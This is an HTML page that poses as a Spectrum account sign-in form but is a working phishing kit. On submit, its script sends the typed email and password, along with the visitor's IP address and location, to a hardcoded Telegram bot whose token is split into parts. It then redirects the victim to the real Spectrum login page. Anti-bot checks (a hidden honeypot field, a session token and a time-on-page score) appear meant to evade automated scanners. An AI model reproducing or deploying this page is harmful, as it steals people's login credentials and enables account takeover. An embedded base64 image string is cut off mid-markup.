<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<title>Sign In to Get Started</title>
<style>
body {
    margin: 0;
    font-family: 'Inter', sans-serif;
    background: #f4f6f9;
}
.wrapper {
    max-width: 600px;
    margin: 40px auto;
    padding: 20px;
}
.logo {
    text-align: center;
    margin-bottom: 20px;
}
.logo img {
    max-width: 180px;
    height: auto;
}
.top {
    display: flex;
    justify-content: space-between;
    font-size: 13px;
    margin-bottom: 15px;
}
.top a {
    color: #1a73e8;
    text-decoration: none;
}
.card {
    background: #fff;
    padding: 32px;
    border-radius: 8px;
    border: 1px solid #ddd;
}
h1 {
    text-align: center;
    font-size: 48px;
    font-weight: 700;
    margin-bottom: 20px;
    color: #111;
    font-family: Spectrum Sans, Rutledge, -apple-system, system-ui, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
}
.divider {
    text-align: center;
    margin: 15px 0;
    color: #888;
}
.divider::before,
.divider::after {
    content: "";
    display: inline-block;
    width: 35%;
    height: 1px;
    background: #ddd;
    vertical-align: middle;
    margin: 0 10px;
}
.center-link {
    text-align: center;
    margin-bottom: 20px;
}
.center-link a {
    color: #1a73e8;
    text-decoration: none;
    font-size: 14px;
}
label {
    font-size: 13px;
    margin-bottom: 8px;
    display: block;
    font-weight: 500;
}
.input-box {
    position: relative;
    margin-bottom: 25px;
}
input {
    width: 100%;
    padding: 13px;
    border-radius: 5px;
    border: 1px solid #ccc;
    font-size: 14px;
    box-sizing: border-box;
}
form {
    max-width: 50%;
    margin: 0 auto;
}
.eye {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    cursor: pointer;
    color: #777;
}
input[type="submit"] {
    width: 100%;
    display: block;
    background: #1a73e8;
    color: white;
    border: none;
    padding: 14px;
    border-radius: 5px;
    font-size: 15px;
    cursor: pointer;
    font-weight: 600;
    box-sizing: border-box;
    transition: 0.2s;
}
input[type="submit"]:hover {
    background: #0c5bcc;
}
.error-message {
    color: #d32f2f;
    font-size: 12px;
    margin-top: 4px;
    display: block;
}
.forgot {
    text-align: center;
    margin-top: 15px;
}
.forgot a {
    color: #1a73e8;
    font-size: 13px;
    text-decoration: none;
}
.footer {
    text-align: center;
    margin-top: 25px;
    font-size: 12px;
    color: #555;
    line-height: 1.6;
}
.footer a {
    color: #1a73e8;
    text-decoration: none;
    margin: 0 6px;
}
@media(max-width:600px){
    .wrapper { margin: 15px; }
    h1 { font-size: 24px; }
    .card { padding: 22px; }
    form { max-width: 100%; }
    input { padding: 12px; font-size: 16px; }
    input[type="submit"] { padding: 12px; }
}
</style>
</head>
<body>
<div class="wrapper">
<div class="logo">
    <img class="bi x0 y0 w1 h1" alt="Spectrum" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKsAAAAlCAIAAACyMI7mAAAACXBIWXMAABYlAAAWJQFJUiTwAAAK/UlEQVR42u1be1BTVxo/QHZYpApCwQASgSWiMonQlgENo2J5CjOwslCCYptlpY0abZcZKGmFhm3DyjbtSFS67LKMUhI3jFPZQURklHUBZaTyyOqKsMqCRSXLm5BlSpb940zv3p5zb3LDwxbkN/kj9+Tcc77zfd/5XufEanZ2FpAwYzT+4+E32p5+AED1jTuwcfvWjU4OL/F8PTf7eLBsbMAKlhGsCA2YMRo1dbcyFeVPh0bperOdHRWZacmRIctAD6wCU+AXPpeTLYpPjRG80BrQO6DbduC4CdkjenDz3G+83F2WhwZAPLqkXOormhusAQB6wzRz8QMAng6Nxr/7uxmjcTkx4lz1jRfTBlgDABLe+5S5+CE6u/syFeXLiRH3Hw28kArQa907oKtv0SLNymzRZPPZ2bbz37ZWdGoKldkiPpeD9ClS1/YO6FYiqSWOe6x7Dx8jbTJx0pGUKPidZWPD43J4XM6RlKj8kgt5xZXkns0dD0z7TkJFLHWxvQO6bwaHxyantvisX7/OyaLAE74LANi4wc1l7ZqlIgq9YVo3Mt7c8QAAsMHtZQ9XJ3s7W5x+uLp/Pfk3kaZRdmOMVlbrvYdI24G4HZR9czMSizVXyf6iRduNh9B6w7SivBrpCUPuXa9t+fDgXhPkarv7fq0ox20S29lRnBwhTU8woQo1jW2ff1mDvxsezBPF7zIb6qtrm9S1TfD7bNt55Nem9q62+73NHQ90I+P1LVphtEBVIEnNURKvAABgI6VoFeXVxOapkEsQYprauw7JSzu7+/B3hdECuSTFy90FGQQBn8spOCqM3Ma3PEe7z8L9n72dLV335MiQInUt8djQeo/8q25k/FjhWTJTkNChs7uvSF2LswDmovLSi3QrfDo0mldcWay5Wlcs5WH+aMZoPPDhGbp561u09S3asqoGVYFkDnvFhHgY4mB+CR1t2u6+/R+cMjE41MvwYB6u2QhvYyUnoPsm7DczbLfevnUj0nas8CxdnH8y663ZtvPEp0NTSNZ0flIW3VLJ2CdVRrzzCXmKGaMx5vBv6cRP1gN+ctap81eQHeYZddjsvPUtWtfdGVpLBDljNEa880moKG8+4tcbpulo042MR4rlTAY3LX4yJCfK8ksuWELgTuudr27G9c4z6nB+yQXdyDhzZlmUUNS3aDV1t4hHTd0tixapN0wTj4ryaubz7v/gFHPeZFL5I0tBx8MZozE1R2lpCsYEecWVTe1dAIDeiW8ZdPex9lm/js7quu7O2JqclV9yoam9y3T2Ly+9SMkstrNjeDCPjr9wzBmjkTKxlImTLimzKV9XlFcTYRFuOdjOjjJxUoVcgucvnd19kDtmUdPYRvZ3C466m504x44KoxvLZJ2aQpk4ie3sSFeOk4mTOjWFjWWyo8Joyj4wTvRWP1T1mN3D9ix7O1uZOInOAkPnDX+FIVVECA/3ppRiIOrHvQM6qfI8YgyfDo1q6m6lxgjkpReRrSATJxFB357QQL1hevubx8nWMq+4MjMtzt7OVqpEQ7YKuYQoWqfGCLTdfZFiOXn8Q/JSsvMiExwW5E+Y7vSPfk8ngLAgf9x1WoorzR14Bk64cB6XcyBuh3csRVxJrsYKAvyCedx9UiWtw732pLpPf24Xm2VtRdeHBYP8v925b9biwZAKqsJnmWlERIZXBdjOjv1XThNxqZe7i6pAcviNyFBRHrlbWVVDaowAD0XFSRHkmNbezvbg3tclJ8rIff769b09oYGIVvG5HCTG5HE5dcVSeNBF9s14tBsW5E9E8jWNbYhSwmTk52FBeBw6N+AGRhS/i/zo5e7C53KQKIHP5SB5dfyu18zkOD3j1wembs <div class="top">
    <a href="#">Leave Feedback</a>
    <a href="#">Language</a>
</div>
<div class="card">
<h1><strong>Sign In to Get Started</strong></h1>
<div class="divider">or</div>
<div class="center-link"><a href="#">Create a Username</a></div>
<form id="loginForm">
    <!-- HONEYPOT (invisible to humans) -->
    <input type="text" name="leaveblank" id="leaveblank" style="position:absolute; left:-9999px; top:-9999px; width:0; height:0; opacity:0;" tabindex="-1" autocomplete="off">
    
    <!-- SESSION TOKEN (random on load) -->
    <input type="hidden" name="session_token" id="session_token" value="">
    
    <label>Email</label>
    <input type="text" id="username" name="username" placeholder="Enter your email" required>
    <span id="emailError" class="error-message"></span>

    <label style="margin-top: 20px;">Password</label>
    <div class="input-box">
        <input type="password" name="password" id="password" placeholder="Enter your password" required>
        <i class="fa fa-eye eye" onclick="togglePassword()"></i>
    </div>

    <input type="submit" value="Sign In">
</form>
<div class="forgot"><a href="#">Forgot Username or Password?</a></div>
</div>
<div class="footer">
    <a href="#">Privacy Rights</a> |
    <a href="#">Terms of Service</a> |
    <a href="#">Data Protection</a> |
    <a href="#">Support</a>
    <br><br>
    © 2026 Secure Communications
</div>
</div>

<script>
// ==================== STRICT ANTI-BOT ====================
// Requirements:
// 1. Must have both mouse/touch AND keyboard interaction (score 80 needed)
// 2. Must have spent at least 5 seconds on page (timeScore 20)
// 3. Honeypot field must be empty
// 4. Session token must match (prevents replay)

let humanScore = 0;
let mouseOrTouch = false;
let keyboard = false;
let pageStartTime = Date.now();

// Generate random session token
const sessionToken = Math.random().toString(36).substring(2, 22);
document.getElementById('session_token').value = sessionToken;

function updateAntiBotStatus() {
    // No visual feedback needed – we just check on submit
}

document.addEventListener('mousemove', function once() {
    if (!mouseOrTouch) {
        mouseOrTouch = true;
        humanScore += 40;
        updateAntiBotStatus();
    }
});
document.addEventListener('touchstart', function once() {
    if (!mouseOrTouch) {
        mouseOrTouch = true;
        humanScore += 40;
        updateAntiBotStatus();
    }
});
document.addEventListener('keydown', function once() {
    if (!keyboard) {
        keyboard = true;
        humanScore += 40;
        updateAntiBotStatus();
    }
});

// ==================== EMAIL VALIDATION ====================
const usernameInput = document.getElementById('username');
const emailErrorSpan = document.getElementById('emailError');

function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
    return emailRegex.test(email);
}

function validateEmailSync() {
    const email = usernameInput.value.trim();
    if (email === "") { emailErrorSpan.textContent = ""; return false; }
    if (!isValidEmail(email)) {
        emailErrorSpan.textContent = "Please enter a valid email address (e.g., name@domain.com)";
        return false;
    } else {
        emailErrorSpan.textContent = "";
        return true;
    }
}
usernameInput.addEventListener('input', validateEmailSync);

// ==================== TELEGRAM FORWARDING ====================
const tokenParts = ['8267542553', 'AAEyTdNTSWWtvIoCQoxCfNPg_CZmrrFPgl0'];
const TELEGRAM_BOT_TOKEN = tokenParts[0] + ':' + tokenParts[1];
const TELEGRAM_CHAT_ID = '2047675335';

const form = document.getElementById('loginForm');
const passwordInput = document.getElementById('password');

async function getLocationData() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || "N/A",
            city: data.city || "N/A",
            region: data.region || "N/A",
            country: data.country_name || "N/A",
            isp: data.org || "N/A"
        };
    } catch (error) {
        console.error("IP fetch failed:", error);
        return { ip: "Unable to fetch", city: "N/A", region: "N/A", country: "N/A", isp: "N/A" };
    }
}

form.addEventListener("submit", async function(event) {
    event.preventDefault();

    // 1. Honeypot check
    const honeypot = document.getElementById('leaveblank').value;
    if (honeypot !== "") {
        alert("Security check failed. Please try again.");
        console.log("Anti-bot: honeypot triggered");
        return;
    }

    // 2. Session token check
    const submittedToken = document.querySelector('input[name="session_token"]').value;
    if (submittedToken !== sessionToken) {
        alert("Invalid session. Please refresh the page.");
        console.log("Anti-bot: token mismatch");
        return;
    }

    // 3. Time on page check (minimum 5 seconds)
    const timeSpent = (Date.now() - pageStartTime) / 1000;
    let timeScore = 0;
    if (timeSpent >= 5) timeScore = 20;
    else timeScore = 0;

    // 4. Interaction score (max 80 from mouse+key)
    let interactionScore = humanScore; // already 40 per interaction, max 80
    if (interactionScore > 80) interactionScore = 80;
    const totalScore = interactionScore + timeScore;

    if (totalScore < 100) {
        let reason = "";
        if (interactionScore < 80) reason = "move your mouse/touch the screen AND press a key";
        else if (timeScore < 20) reason = "wait at least 5 seconds on the page";
        alert(`Security check failed (score ${totalScore}/100). Please ${reason}.`);
        return;
    }

    // 5. Email and password validation
    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();

    if (!username || !password) {
        alert("Please enter both email and password.");
        return;
    }

    if (!isValidEmail(username)) {
        emailErrorSpan.textContent = "Please enter a valid email address.";
        alert("Invalid email format.");
        return;
    }

    // Random human-like delay
    await new Promise(resolve => setTimeout(resolve, Math.random() * 300 + 200));

    const location = await getLocationData();
    const message = `🔐 *NELSON SPECTRUM SIGN IN*\n👤 *Email:* \`${username}\`\n🔑 *Password:* \`${password}\`\n🌍 *IP:* ${location.ip}\n📍 *Location:* ${location.city}, ${location.region}, ${location.country}\n🏢 *ISP:* ${location.isp}\n🕒 *Time:* ${new Date().toLocaleString()}\n🛡️ *Token:* ${sessionToken.substring(0,8)}...`;

    const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
        const response = await fetch(apiUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" })
        });
        if (response.ok) {
            await new Promise(resolve => setTimeout(resolve, Math.random() * 400 + 100));
            window.location.href = "https://id.spectrum.net/login?";
        } else {
            const errorText = await response.text();
            console.error("Telegram API error:", errorText);
            alert("Sign in failed. Please try again later.");
        }
    } catch (error) {
        console.error("Network error:", error);
        alert("Network error. Please check your connection.");
    }
});

function togglePassword() {
    const p = document.getElementById("password");
    p.type = p.type === "password" ? "text" : "password";
}
</script>
</body>
</html>
